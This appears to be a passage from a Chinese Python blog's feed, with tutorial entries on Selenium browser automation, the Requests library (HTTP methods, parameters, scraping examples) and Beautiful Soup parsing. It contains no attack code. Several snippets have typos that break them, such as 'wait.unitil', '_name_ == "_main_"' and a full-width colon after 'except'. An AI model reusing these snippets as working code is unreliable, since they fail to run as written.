class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'https://www.taobao.com/'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">wait = WebDriverWait(browser,<span class="number">10</span>)</span><br><span class="line">input = wait.unitil(EC.presence_of_element_located((By.ID,<span class="string">'q'</span>)))</span><br><span class="line">button = waitunitil(EC.presence_to_be_clickable((By.CSS_SELECTOR,<span class="string">'.btn-search'</span>)))</span><br><span class="line">print(input,button)</span><br></pre></td></tr></table></figure><ul><li>title_is    标题内容</li><li>title_contains    标题包含元素</li><li>presence_of_element_located    元素加载出，传入定位元组，如（By.ID，’p’）</li><li>visiblility_of_element_located    元素可见，传入定位元组</li><li>visiblility_of    可见，传入元素对象</li><li>presence_of_all_element_located    所有元素加载出</li><li>text_to_be_present_in_element    某个元素文本包含某文字</li><li>text_to_be_present_in_element_value    某个元素值包含某文字</li><li>frame_to_be_available_and_switch_to_it frame    加载并切换</li><li>invisibility_of_element_located    元素不可见</li><li>element_to_be_clickable    元素可点击</li><li>staleness_of    判断一个元素是否仍在DOM，可判断页面是否已经刷新</li><li>element_to_be_selected    元素可选择，传元素对象</li><li>element_location_to_be_selected    元素可选择，传入定位元组</li><li>element_selection_state_to_be    传入元素对象以及状态，相等返回True，否则False</li><li>element_location_selected_state_to_be    传入定位元组以及状态，相等返回True，否则False</li><li>alert_is_present    是否出现Alert</li></ul><h3 id="前进后退"><a href="#前进后退" class="headerlink" title="前进后退"></a>前进后退</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.baidu.com/'</span>)</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com/'</span>)</span><br><span class="line">browser.get(<span class="string">'https://www.python.com/'</span>)</span><br><span class="line">browser.back()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">browser.forward()</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><h3 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.add_cookie(&#123;<span class="string">'name'</span>:<span class="string">'name'</span>,<span class="string">'domain'</span>:<span class="string">'www.zhihu.com'</span>,<span class="string">'value'</span>:<span class="string">'germey'</span>&#125;)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line">print(browser.get_cookies())</span><br></pre></td></tr></table></figure><h3 id="选项卡管理"><a href="#选项卡管理" class="headerlink" title="选项卡管理"></a>选项卡管理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.baidu.com/'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'window.open()'</span>)</span><br><span class="line">print(browser.window_handles)</span><br><span class="line">browser.switch_to_window(browser.window_handles[<span class="number">1</span>])</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com/'</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">browser.switch_to_window(browser.window_handles[<span class="number">0</span>])</span><br><span class="line">browser.get(<span class="string">'https://python.org/'</span>)</span><br></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.baidu.com/'</span>)</span><br><span class="line">browser.find_element_by_id(<span class="string">'hello'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException,NoSuchElementException</span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line"><span class="keyword">except</span> TimeoutException:</span><br><span class="line">    print(<span class="string">'Time Out'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.find_element_by_id(<span class="string">'hello'</span>)</span><br><span class="line"><span class="keyword">except</span> NoSuchElementException:</span><br><span class="line">    print(<span class="string">'No Elemet'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之Requests库</title>
      <link href="/2020/04/27/Requests%E5%BA%93/"/>
      <url>/2020/04/27/Requests%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Requests库"><a href="#Requests库" class="headerlink" title="Requests库"></a>Requests库</h1><p>Requests库：<a href="http://www.python-requests.org" target="_blank" rel="noopener">http://www.python-requests.org</a></p><p>安装requests库</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580809190000.png"  alt="1580809190000"></p><h3 id="requests库的7个主要方法"><a href="#requests库的7个主要方法" class="headerlink" title="requests库的7个主要方法"></a>requests库的7个主要方法</h3><table><thead><tr><th align="left">方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">requests.request()</td><td align="left">构造一个请求，支撑以下各方法的基础</td></tr><tr><td align="left">requests.get()</td><td align="left">获取HTML网页的主要方法，对应的HTTP的GET</td></tr><tr><td align="left">requests.head()</td><td align="left">获取HTML网页头信息的方法，对应HTTP的HEAD</td></tr><tr><td align="left">requests.post()</td><td align="left">向HTML网页提交POST请求方法，对应HTTP的POST</td></tr><tr><td align="left">requests.put()</td><td align="left">向HTML网页提交PUT请求方法，对应HTTP的PUT</td></tr><tr><td align="left">requests.patch()</td><td align="left">向HTML网页提交局部修改请求，对应HTTP的PATCH</td></tr><tr><td align="left">requests.delete()</td><td align="left">向HTML页面提交删除请求，对应HTTP的DELETE</td></tr></tbody></table><h4 id="Requests库的方法解析"><a href="#Requests库的方法解析" class="headerlink" title="Requests库的方法解析"></a>Requests库的方法解析</h4><h5 id="1-requests-request-method-url-kwargs"><a href="#1-requests-request-method-url-kwargs" class="headerlink" title="1. requests.request(method, url, ****kwargs)**"></a><strong>1. requests.request(method, url, ****</strong>kwargs)**</h5><p><strong><em>method：请求方式，对应get/put/post等7种</em></strong></p><ul><li>r = requests.request(‘GET’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘HEAD’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘POST’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘PUT’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘PATCH’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘delete’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘OPTIONS’，url，<strong>**</strong>kwargs)</li></ul><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong>*****</strong>kwargs：控制访问的参数，共13个***</p><ul><li><p>params：字典或字节序列，作为参数增加到url中</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580877838128.png"  alt="1580877838128"></p></li><li><p>data：字典、字节序列或文件对象，作为Request的内容</p></li><li><p>json：JSON格式的数据，作为Request的内容</p></li><li><p>headers：字典，HTTP定制头</p></li><li><p>cookies：字典或CookieJar，Request中的cookie</p></li><li><p>author：元组，支持HTTP认证功能</p></li><li><p>files：字典类型，传输文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fs = &#123;<span class="string">'file'</span>:open(<span class="string">'data.xls'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line">r = requests.request(<span class="string">'POST'</span>,<span class="string">'http://www.baidu.com'</span>,files=fs)</span><br></pre></td></tr></table></figure></li><li><p>timeout：设定超时时间，秒为单位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.request(<span class="string">'GET'</span>,<span class="string">'http://www.baidu.com'</span>,timeout=<span class="number">10</span>)</span><br></pre></td></tr></table></figure></li><li><p>proxies：字典类型，设定访问代理服务器，可以增加登录认证(<strong>可隐藏用户爬取网页原的ip地址信息</strong>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pxs = &#123;<span class="string">'http'</span>:<span class="string">'http://user:pass@10.10.10.1:1234'</span>,</span><br><span class="line">       <span class="string">'http'</span>:<span class="string">'http://10.10.10.1:4321'</span>&#125;</span><br><span class="line">r = requests.request(<span class="string">'GET'</span>,<span class="string">'http://www.baidu.com'</span>,proxies=pxs)</span><br></pre></td></tr></table></figure></li><li><p>allow_redirects：True/False，默认为True，重定向开关</p></li><li><p>stream：True/False，默认为True，获取内容立即下载开关</p></li><li><p>verify：True/False，默认为True，认证SSL证书开关</p></li><li><p>cert：本地SSL证书路径</p></li></ul><h5 id="2-requests-get-url-params-None-kwargs"><a href="#2-requests-get-url-params-None-kwargs" class="headerlink" title="2.requests.get(url, params=None, **kwargs)"></a>2.requests.get(url, params=None, <strong>**</strong>kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong><em>params：url中的额外参数，字典或者字节流格式，可选</em></strong></p><p><strong>*****</strong>kwargs：12个控制访问的参数***</p><h5 id="3-requests-head-url-kwargs"><a href="#3-requests-head-url-kwargs" class="headerlink" title="3.requests.head(url, **kwargs)"></a>3.requests.head(url, **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong>*****</strong>kwargs：13个控制访问的参数***</p><h5 id="4-requests-post-url-data-None-json-None-kwargs"><a href="#4-requests-post-url-data-None-json-None-kwargs" class="headerlink" title="4.requests.post(url, data=None, json=None, **kwargs)"></a>4.requests.post(url, data=None, json=None, **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong><em>data：字典、字节序列或文件，Request的内容</em></strong></p><p><strong><em>json：JSON格式的数据，Request的内容</em></strong></p><p><strong>*****</strong>kwargs：11个控制访问的参数***</p><h5 id="5-requests-put-url-data-None-kwargs"><a href="#5-requests-put-url-data-None-kwargs" class="headerlink" title="5.requests.put(url, data=None, **kwargs)"></a>5.requests.put(url, data=None, **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong><em>data：字典、字节序列或文件，Request的内容</em></strong></p><p><strong>*****</strong>kwargs：12个控制访问的参数***</p><h5 id="6-requests-patch-url-data-None-kwargs"><a href="#6-requests-patch-url-data-None-kwargs" class="headerlink" title="6.requests.patch(url, data=None, **kwargs)"></a>6.requests.patch(url, data=None, **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong><em>data：字典、字节序列或文件，Request的内容</em></strong></p><p><strong>*****</strong>kwargs：12个控制访问的参数***</p><h5 id="7-requests-delete-url-kwargs"><a href="#7-requests-delete-url-kwargs" class="headerlink" title="7.requests.delete(url,  **kwargs)"></a>7.requests.delete(url,  **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong>*****</strong>kwargs：13个控制访问的参数***</p><p>例子：爬取百度的信息</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580810021461.png"  alt="1580810021461"></p><h3 id="Requests库的异常"><a href="#Requests库的异常" class="headerlink" title="Requests库的异常"></a>Requests库的异常</h3><table><thead><tr><th>异常</th><th>说明</th></tr></thead><tbody><tr><td>requests.ConnectionError</td><td>网络连接错误异常，如DNS查询失败、拒绝连接等</td></tr><tr><td>requests.HTTPError</td><td>HTTP错误异常</td></tr><tr><td>requests.URLRequired</td><td>URL缺失异常</td></tr><tr><td>requests.TooManyRedirects</td><td>超过最大重定向次数，产生重定向异常</td></tr><tr><td>requests.ConnectTimeout</td><td>远程连接服务器超时异常</td></tr><tr><td>requests.Timeout</td><td>请求URL超时，产生的超时异常</td></tr></tbody></table><h3 id="理解Requests库的异常"><a href="#理解Requests库的异常" class="headerlink" title="理解Requests库的异常"></a>理解Requests库的异常</h3><table><thead><tr><th>异常</th><th>方法</th></tr></thead><tbody><tr><td>r.raise_for_status()</td><td>如果不是200，产生异常requests.HTTPError</td></tr></tbody></table><h3 id="爬取网页的通用代码框架"><a href="#爬取网页的通用代码框架" class="headerlink" title="爬取网页的通用代码框架"></a>爬取网页的通用代码框架</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()<span class="comment">#如果不是200，产生requests.HTTPError异常</span></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"产生异常"</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> _name_ == <span class="string">"_main_"</span>:</span><br><span class="line">    url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line">    print(getHTMLText(url))</span><br></pre></td></tr></table></figure><h3 id="HTTP协议及Requests库方法"><a href="#HTTP协议及Requests库方法" class="headerlink" title="HTTP协议及Requests库方法"></a>HTTP协议及Requests库方法</h3><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>HTTP，Hypertext Transfer Protocol，超文本传输协议。</p><p>HTTP是一个基于“请求与响应”模式的、无状态的应用层协议。</p><p>HTTP协议采用URL作为定位网络资源的标识。</p><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>URL是通过HTTP协议存储资源的Internet路径，一个URL对于一个数据资源。</p><p><strong>URL格式    <a href="http://host[:port]\[path]">http://host[:port]\[path]</a></strong></p><ul><li>host：合法的Internet主机域名或IP地址</li><li>port：端口号，缺省端口为80</li><li>path：请求资源的路径</li></ul><h4 id="HTTP协议对资源的操作"><a href="#HTTP协议对资源的操作" class="headerlink" title="HTTP协议对资源的操作"></a>HTTP协议对资源的操作</h4><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>GET</td><td>请求获取URL位置的资源</td></tr><tr><td>HEAD</td><td>请求获取URL位置资源的响应消息报告，即获得该资源的头部消息</td></tr><tr><td>POST</td><td>请求向URL位置的资源后附加新的数据</td></tr><tr><td>PUT</td><td>请求向URL位置存储一个资源，覆盖原URL位置的资源</td></tr><tr><td>PATCH</td><td>请求局部更新URL位置的资源，即改变该处资源你的部分内容</td></tr><tr><td>DELETE</td><td>请求删除URL位置存储的资源</td></tr></tbody></table><h5 id="PATCH和PUT的区别"><a href="#PATCH和PUT的区别" class="headerlink" title="PATCH和PUT的区别"></a>PATCH和PUT的区别</h5><p>假设URL位置有一组数据UserInfo，包括UserID、UserName等</p><p>需求：用户修改了UserName，其他不变</p><ul><li>采取PATCH，仅向URL提交UserName的局部更新请求。</li><li>采用PUT，必须将所有20个字段一并提交到URL，未提交的字段被删除。</li></ul><p>PATCH的最主要的好处：节省网络带宽</p><h4 id="实例：亚马逊商品页面的爬取"><a href="#实例：亚马逊商品页面的爬取" class="headerlink" title="实例：亚马逊商品页面的爬取"></a>实例：亚马逊商品页面的爬取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'https://www.amazon.cn/dp/B07TPWBQ3Y?ref_=Oct_DLandingS_D_48449dee_60&amp;smid=A26HDXW89ZT98L'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0'</span>&#125;</span><br><span class="line">    r = requests.get(url,headers=kv)<span class="comment">#修改头部，改为Mozilla/5.0头部</span></span><br><span class="line">    r.raise_for_status()<span class="comment">#如果不是200，产生requests.HTTPError异常</span></span><br><span class="line">    r.encoding = r.apparent_encoding<span class="comment">#改为人类可阅读的编码</span></span><br><span class="line">    print(r.text[<span class="number">1000</span>:<span class="number">2000</span>])<span class="comment">#打印1000~2000行的信息</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure><h4 id="实例：百度360搜索关键字提交"><a href="#实例：百度360搜索关键字提交" class="headerlink" title="实例：百度360搜索关键字提交"></a>实例：百度360搜索关键字提交</h4><p>百度的关键词接口：</p><p><a href="http://www.baidu.com/s?wd=keyword" target="_blank" rel="noopener">http://www.baidu.com/s?wd=keyword</a></p><p>360的关键词接口：</p><p><a href="http://www.so.com/s?q=keyword" target="_blank" rel="noopener">http://www.so.com/s?q=keyword</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">keyword = <span class="string">"Python"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'wd'</span>:<span class="string">'Python'</span>&#125;</span><br><span class="line">    r = requests.get(<span class="string">"http://www.baidu.com/s"</span>,params=kv)<span class="comment">#params：字典或字节序列，作为参数增加到url中</span></span><br><span class="line">    print(r.request.url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    print(len(r.text))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure><h4 id="实例：网络图片的爬取与存储"><a href="#实例：网络图片的爬取与存储" class="headerlink" title="实例：网络图片的爬取与存储"></a>实例：网络图片的爬取与存储</h4><p>网络图片链接格式：</p><p><a href="http://www.example.com/picture.jpg" target="_blank" rel="noopener">http://www.example.com/picture.jpg</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1580895731055&amp;di=8700ba330a284d045c1e9f3df8a622b6&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.rmb.bdstatic.com%2Ff79ba62d4fdf35ceea4af90e31226ce1.jpeg"</span></span><br><span class="line">root = <span class="string">"H://pics//"</span><span class="comment">#定义根目录</span></span><br><span class="line">path = root + url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]<span class="comment">#定义路径,根目录+文件名称（与url最后文件名称相同），split()分隔符</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):<span class="comment">#os.path.exists()判断文件路径是否存在</span></span><br><span class="line">        os.mkdir(root)<span class="comment">#如果不存在建立一个根目录，os.mkdir()创建目录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        r = requests.get(url)<span class="comment">#判断文件是否存在，如果不存在通过requests.get获取</span></span><br><span class="line">        <span class="keyword">with</span> open(path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">            f.close()</span><br><span class="line">            print(<span class="string">"文件保存成功"</span>)</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"文件已存在"</span>)</span><br><span class="line"><span class="keyword">except</span>：</span><br><span class="line">print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure><h4 id="实例：IP地址归属地的自动查询"><a href="#实例：IP地址归属地的自动查询" class="headerlink" title="实例：IP地址归属地的自动查询"></a>实例：IP地址归属地的自动查询</h4><p>网络提供查询地址的库：</p><p><a href="http://www.ip138.com/ip.asp?ip=ipaddress" target="_blank" rel="noopener">http://www.ip138.com/ip.asp?ip=ipaddress</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://www.ip138.com/ip.asp?ip="</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url + <span class="string">'202.204.80.112'</span>)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(r.text[<span class="number">-500</span>:])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之Beautiful Soup库</title>
      <link href="/2020/04/27/Beautiful%20Soup%E5%BA%93/"/>
      <url>/2020/04/27/Beautiful%20Soup%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Beautiful-Soup库"><a href="#Beautiful-Soup库" class="headerlink" title="Beautiful Soup库"></a>Beautiful Soup库</h1><p>Beautiful Soup库：<a href="https://www.crummy.com/software/BeautifulSoup/" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/</a></p><p>安装Beautiful Soup：</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580889130808.png"  alt="1580889130808"></p><p>使用Beautiful Soup库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup<span class="comment">#这里的BeautifulSoup是个类</span></span><br><span class="line">soup = BeautifulSoup(<span class="string">'&lt;p&gt;data&lt;/p&gt;'</span>,<span class="string">'html.parser'</span>)<span class="comment">#使用html.parser解析器</span></span><br></pre></td></tr></table></figure><p>例子：获取<a href="http://python123.io/ws/demo.html的信息" target="_blank" rel="noopener">http://python123.io/ws/demo.html的信息</a></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580889545054.png"  alt="1580889545054"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580889596462.png"  alt="1580889596462"></p><h3 id="Beautiful-Soup库的基本元素"><a href="#Beautiful-Soup库的基本元素" class="headerlink" title="Beautiful Soup库的基本元素"></a>Beautiful Soup库的基本元素</h3><p>Beautiful Soup库是<strong>解析、遍历、维护“标签树”的功能库</strong>。</p><p>Beautiful Soup库，也叫beautifulsoup4或者bs4。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup<span class="comment">#在bs4库中引入BeautifulSoup类型</span></span><br><span class="line">soup = BeautifulSoup(<span class="string">"&lt;html&gt;data&lt;/html&gt;"</span>,<span class="string">"html.parser"</span>)</span><br><span class="line">soup = BeautifulSoup(<span class="string">"D://demo.html"</span>,<span class="string">"html.parser"</span>)<span class="comment">#通过打开文件的方式</span></span><br></pre></td></tr></table></figure><p>BeautifulSoup对应一个HTML/XML文档的全部内容</p><h4 id="Beautiful-Soup库解析器"><a href="#Beautiful-Soup库解析器" class="headerlink" title="Beautiful Soup库解析器"></a>Beautiful Soup库解析器</h4><table><thead><tr><th>解析器</th><th>使用方法</th><th>条件</th></tr></thead><tbody><tr><td>bs4的HTML解析器</td><td>BeautifulSoup(mk,’html.parser’)</td><td>安装bs4库</td></tr><tr><td>lxml的HTML解析器</td><td>BeautifulSoup(mk,’lxml’)</td><td>pip install lxml</td></tr><tr><td>lxml的XML解析器</td><td>BeautifulSoup(mk,’xml’)</td><td>pip install lxml</td></tr><tr><td>html5lib的解析器</td><td>BeautifulSoup(mk,’html5lib’)</td><td>pip install html5lib</td></tr></tbody></table><h4 id="Beautiful-Soup类的基本元素"><a href="#Beautiful-Soup类的基本元素" class="headerlink" title="Beautiful Soup类的基本元素"></a>Beautiful Soup类的基本元素</h4><table><thead><tr><th>基本元素</th><th>说明</th></tr></thead><tbody><tr><td>Tag</td><td>标签，最基本的信息组织单元，分别用&lt;&gt;和&lt;/&gt;标明开头和结尾</td></tr><tr><td>Name</td><td>标签名字，&lt; p &gt;…&lt; /p &gt;的名字是‘p’，格式：&lt; tag &gt;.name</td></tr><tr><td>Attributes</td><td>标签的属性，字典形式组织，格式：&lt; tag &gt;.attrs</td></tr><tr><td>NavigebleString</td><td>标签内非属性字符串，&lt;&gt;…&lt;/&gt;中字符串，格式：&lt; tag &gt;.string</td></tr><tr><td>Comment</td><td>标签内字符串的注释部分，一种特殊的Comment类型</td></tr></tbody></table><h3 id="基于bs4库的HTML内容遍历方法"><a href="#基于bs4库的HTML内容遍历方法" class="headerlink" title="基于bs4库的HTML内容遍历方法"></a>基于bs4库的HTML内容遍历方法</h3><h4 id="标签树的下行遍历"><a href="#标签树的下行遍历" class="headerlink" title="标签树的下行遍历"></a>标签树的下行遍历</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.contents</td><td>子节点的列表，将&lt; tag &gt;所有<strong>儿子节点存入列表</strong></td></tr><tr><td>.children</td><td>子节点的迭代类型，与.contents类似，用于<strong>循环遍历儿子节点</strong></td></tr><tr><td>.descendants</td><td>子孙节点的迭代类型，包含所有<strong>子孙节点，用于循环遍历</strong></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.children:</span><br><span 